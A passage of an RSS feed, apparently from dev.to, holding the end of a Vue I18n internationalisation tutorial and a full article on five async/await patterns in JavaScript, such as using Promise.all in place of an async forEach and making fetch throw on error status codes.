}&lt;/p&gt;

&lt;p&gt;`&lt;code&gt;&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;In order to use nested translation keys, the process is simple, since Vue I18n works  with the full translation key path, like this:&lt;/p&gt;

&lt;p&gt;&lt;code&gt;&lt;/code&gt;&lt;code&gt;&lt;br&gt;
&amp;lt;template&amp;gt;&lt;br&gt;
  &amp;lt;Layout&amp;gt;&lt;br&gt;
    &amp;lt;h1&amp;gt;{{ $t('navbar.links.contact.label') }}&amp;lt;/h1&amp;gt;&lt;br&gt;
  &amp;lt;/Layout&amp;gt;&lt;br&gt;
&amp;lt;/template&amp;gt;&lt;br&gt;
&lt;/code&gt;&lt;code&gt;&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;src/router/index.js&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;code&gt;&lt;/code&gt;`javascript&lt;br&gt;
import Vue from 'vue'&lt;br&gt;
import VueRouter from 'vue-router'&lt;/p&gt;

&lt;p&gt;Vue.use(VueRouter)&lt;/p&gt;

&lt;p&gt;const routes = [&lt;br&gt;
  {&lt;br&gt;
    path: '/',&lt;br&gt;
    name: 'Home',&lt;br&gt;
    component: () =&amp;gt; import('@/views/Home')&lt;br&gt;
  },&lt;br&gt;
  {&lt;br&gt;
    path: '/about',&lt;br&gt;
    name: 'About',&lt;br&gt;
    component: () =&amp;gt; import('@/views/About')&lt;br&gt;
  },&lt;br&gt;
  {&lt;br&gt;
    path: '/contact',&lt;br&gt;
    name: 'Contact',&lt;br&gt;
    component: () =&amp;gt; import('@/views/Contact')&lt;br&gt;
  }&lt;br&gt;
]&lt;/p&gt;

&lt;p&gt;const router = new VueRouter({&lt;br&gt;
  mode: 'history',&lt;br&gt;
  routes&lt;br&gt;
})&lt;/p&gt;

&lt;p&gt;export default router&lt;br&gt;
`&lt;code&gt;&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;This is how the application should work after the full implementation:&lt;/p&gt;

&lt;p&gt;&lt;a href="https://www.loom.com/share/f0ed53a41f0a42b59676af6f4ff6f06b"&gt; &lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--ZJVTnyU7--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_66%2Cw_880/https://cdn.loom.com/sessions/thumbnails/f0ed53a41f0a42b59676af6f4ff6f06b-with-play.gif"&gt; &lt;p&gt;VueJS Internationalization Sample Video&lt;/p&gt; &lt;/a&gt;&lt;/p&gt;

&lt;p&gt;You can find the fully-working source code in &lt;a href="https://github.com/vcpablo/vuejs2-vue-i18n"&gt;this link&lt;/a&gt;!&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#other-features"&gt;
  &lt;/a&gt;
  Other features
&lt;/h3&gt;

&lt;p&gt;Besides translating simple pieces of text, Vue I18n also provides other useful features like:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;a href="https://kazupon.github.io/vue-i18n/guide/formatting.html#named-formatting"&gt;Formatting Interpolation&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;a href="https://kazupon.github.io/vue-i18n/guide/pluralization.html"&gt;Pluralization&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;a href="https://kazupon.github.io/vue-i18n/guide/datetime.html"&gt;Date Time Localization&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;a href="https://kazupon.github.io/vue-i18n/guide/number.html"&gt;Number Localization&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;You may explore the &lt;a href="https://kazupon.github.io/vue-i18n/"&gt;website&lt;/a&gt; to find out more about the tool.&lt;/p&gt;




&lt;p&gt;I hope you liked it.&lt;br&gt;
Please, comment and share!&lt;/p&gt;

&lt;p&gt;Cover image by &lt;a href="https://unsplash.com/@benwhitephotography"&gt;Ben White&lt;/a&gt;&lt;/p&gt;

</description>
      <category>vue</category>
      <category>i18n</category>
      <category>javascript</category>
      <category>beginners</category>
    </item>
    <item>
      <title>5 Async/Await Design Patterns for Cleaner Async Logic</title>
      <author>Mastering JS</author>
      <pubDate>Fri, 25 Jun 2021 17:26:41 +0000</pubDate>
      <link>https://dev.to/masteringjs/5-async-await-design-patterns-for-cleaner-async-logic-1fkh</link>
      <guid>https://dev.to/masteringjs/5-async-await-design-patterns-for-cleaner-async-logic-1fkh</guid>
      <description>&lt;p&gt;At &lt;a href="https://masteringjs.io/"&gt;Mastering JS&lt;/a&gt;, we love &lt;a href="https://masteringjs.io/tutorials/fundamentals/async-await"&gt;async/await&lt;/a&gt;. You might even say we wrote the &lt;a href="https://asyncawait.net/"&gt;book on async/await&lt;/a&gt;. Here's 5 design patterns we use regularly.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#async-raw-foreach-endraw-"&gt;
  &lt;/a&gt;
  Async &lt;a href="https://masteringjs.io/tutorials/fundamentals/foreach"&gt;&lt;code&gt;forEach()&lt;/code&gt;&lt;/a&gt;
&lt;/h2&gt;

&lt;p&gt;Do &lt;strong&gt;not&lt;/strong&gt; use an async &lt;a href="https://masteringjs.io/tutorials/fundamentals/callbacks"&gt;callback&lt;/a&gt; with &lt;code&gt;forEach()&lt;/code&gt;. In general, the way to simulate &lt;a href="https://masteringjs.io/tutorials/fundamentals/async-foreach"&gt;&lt;code&gt;forEach()&lt;/code&gt; with async functions&lt;/a&gt; is to use &lt;code&gt;await Promise.all([arr.map(callback)])&lt;/code&gt;&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight javascript"&gt;&lt;code&gt;&lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;values&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;50&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;100&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;

&lt;span class="c1"&gt;// Do this:&lt;/span&gt;
&lt;span class="k"&gt;await&lt;/span&gt; &lt;span class="nb"&gt;Promise&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;all&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;values&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;map&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;async&lt;/span&gt; &lt;span class="nx"&gt;v&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="k"&gt;await&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="nb"&gt;Promise&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;resolve&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="nx"&gt;setTimeout&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;resolve&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;v&lt;/span&gt;&lt;span class="p"&gt;));&lt;/span&gt;
  &lt;span class="nx"&gt;console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;Slept for&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;v&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;ms&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="p"&gt;}));&lt;/span&gt;

&lt;span class="c1"&gt;// Not this:&lt;/span&gt;
&lt;span class="nx"&gt;values&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;forEach&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;async&lt;/span&gt; &lt;span class="nx"&gt;v&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="k"&gt;await&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="nb"&gt;Promise&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;resolve&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="nx"&gt;setTimeout&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;resolve&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;v&lt;/span&gt;&lt;span class="p"&gt;));&lt;/span&gt;
  &lt;span class="nx"&gt;console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;Slept for&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;v&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;ms&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="p"&gt;});&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h2&gt;
  &lt;a href="#-raw-return-await-endraw-"&gt;
  &lt;/a&gt;
  &lt;code&gt;return await&lt;/code&gt;
&lt;/h2&gt;

&lt;p&gt;Async/await works with &lt;code&gt;try/catch&lt;/code&gt;... almost. There's a gotcha. If you &lt;code&gt;await&lt;/code&gt; on a promise that rejects, JavaScript throws an error that you can &lt;code&gt;catch&lt;/code&gt;. But if you &lt;code&gt;return&lt;/code&gt; a promise that rejects, that ends up as an &lt;a href="https://thecodebarbarian.com/unhandled-promise-rejections-in-node.js.html"&gt;unhandled promise rejection&lt;/a&gt;.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight javascript"&gt;&lt;code&gt;&lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;p&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;Promise&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;reject&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="nb"&gt;Error&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;Oops!&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;));&lt;/span&gt;

&lt;span class="k"&gt;try&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="k"&gt;await&lt;/span&gt; &lt;span class="nx"&gt;p&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;catch&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;err&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="nx"&gt;console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;This runs...&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="k"&gt;try&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="nx"&gt;p&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;catch&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;err&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="nx"&gt;console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;This does NOT run!&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;There are a few workarounds for this quirk, but one approach we like is using &lt;code&gt;return await&lt;/code&gt;.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight javascript"&gt;&lt;code&gt;&lt;span class="k"&gt;try&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="k"&gt;await&lt;/span&gt; &lt;span class="nx"&gt;p&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;catch&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;err&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="nx"&gt;console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;This runs!&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h2&gt;
  &lt;a href="#delayed-raw-await-endraw-"&gt;
  &lt;/a&gt;
  Delayed &lt;code&gt;await&lt;/code&gt;
&lt;/h2&gt;

&lt;p&gt;Sometimes you want to call an &lt;a href="https://thecodebarbarian.com/async-functions-in-javascript.html"&gt;async function&lt;/a&gt;, do something else, and then &lt;code&gt;await&lt;/code&gt; on the async function. Promises are just variables in JavaScript, so you can call an async function, get the promise response, and &lt;code&gt;await&lt;/code&gt; on it later.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight javascript"&gt;&lt;code&gt;&lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;ee&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="nx"&gt;EventEmitter&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;

&lt;span class="c1"&gt;// Execute the function, but don't `await` so we can `setTimeout()`&lt;/span&gt;
&lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;p&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;waitForEvent&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;ee&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;test&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

&lt;span class="nx"&gt;setTimeout&lt;/span&gt;&lt;span class="p"&gt;(()&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="nx"&gt;ee&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;emit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;test&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="mi"&gt;1000&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

&lt;span class="c1"&gt;// Wait until `ee` emits a 'test' event&lt;/span&gt;
&lt;span class="k"&gt;await&lt;/span&gt; &lt;span class="nx"&gt;p&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

&lt;span class="k"&gt;async&lt;/span&gt; &lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="nx"&gt;waitForEvent&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;ee&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;name&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="k"&gt;await&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="nb"&gt;Promise&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;resolve&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="nx"&gt;ee&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;once&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;name&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;resolve&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
  &lt;span class="p"&gt;});&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h2&gt;
  &lt;a href="#-raw-await-endraw-with-promise-chaining"&gt;
  &lt;/a&gt;
  &lt;code&gt;await&lt;/code&gt; with &lt;a href="https://masteringjs.io/tutorials/fundamentals/promise-chaining"&gt;Promise Chaining&lt;/a&gt;
&lt;/h2&gt;

&lt;p&gt;We recommend using &lt;a href="https://masteringjs.io/axios"&gt;Axios&lt;/a&gt; over &lt;code&gt;fetch()&lt;/code&gt;, but in some cases you may need to use &lt;code&gt;fetch()&lt;/code&gt;. And &lt;code&gt;fetch()&lt;/code&gt; famously requires you to asynchronously parse the response body. Here's how you can make a request with &lt;code&gt;fetch()&lt;/code&gt; and parse the response body with 1 &lt;code&gt;await&lt;/code&gt;.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight javascript"&gt;&lt;code&gt;&lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;res&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;await&lt;/span&gt; &lt;span class="nx"&gt;fetch&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;/users&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="nx"&gt;then&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;res&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="nx"&gt;res&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;json&lt;/span&gt;&lt;span class="p"&gt;());&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Another quirk of &lt;code&gt;fetch()&lt;/code&gt; is that it doesn't throw an error if the server responds with an error code, like 400. Here's how you can make &lt;code&gt;fetch()&lt;/code&gt; throw a catchable error if the response code isn't in the 200 or 300 range.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight javascript"&gt;&lt;code&gt;&lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;res&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;await&lt;/span&gt; &lt;span class="nx"&gt;fetch&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;/users&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;
  &lt;span class="nx"&gt;then&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;res&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;res&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;status&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="mi"&gt;200&lt;/span&gt; &lt;span class="o"&gt;||&lt;/span&gt; &lt;span class="nx"&gt;res&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;status&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;=&lt;/span&gt; &lt;span class="mi"&gt;400&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
      &lt;span class="k"&gt;throw&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="nb"&gt;Error&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;Server responded with status code &lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="nx"&gt;res&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;status&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="nx"&gt;res&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="p"&gt;}).&lt;/span&gt;
  &lt;span class="nx"&gt;then&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;res&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="nx"&gt;res&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;json&lt;/span&gt;&lt;span class="p"&gt;());&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h2&gt;
  &lt;a href="#waiting-for-events"&gt;
  &lt;/a&gt;
  Waiting for Events
&lt;/h2&gt;

&lt;p&gt;Event emitters are a common pattern in JavaScript, but they don't work well with async/await because they're not &lt;a href="https://masteringjs.io/tutorials/fundamentals/promise"&gt;promises&lt;/a&gt;. Here's how you can &lt;code&gt;await&lt;/code&gt; on an event from a Node.js event emitter.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight javascript"&gt;&lt;code&gt;&lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;ee&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="nx"&gt;EventEmitter&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;

&lt;span class="nx"&gt;setTimeout&lt;/span&gt;&lt;span class="p"&gt;(()&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="nx"&gt;ee&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;emit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;test&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="mi"&gt;1000&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

&lt;span class="c1"&gt;// Wait until `ee` emits a 'test' event&lt;/span&gt;
&lt;span class="k"&gt;await&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="nb"&gt;Promise&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;resolve&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="nx"&gt;ee&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;once&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;test&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;resolve&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="p"&gt;});&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



</description>
      <category>javascript</category>
      <category>node</category>
      <category>vue</category>
      <category>async</category>
    </item>
  </channel>
</rss>
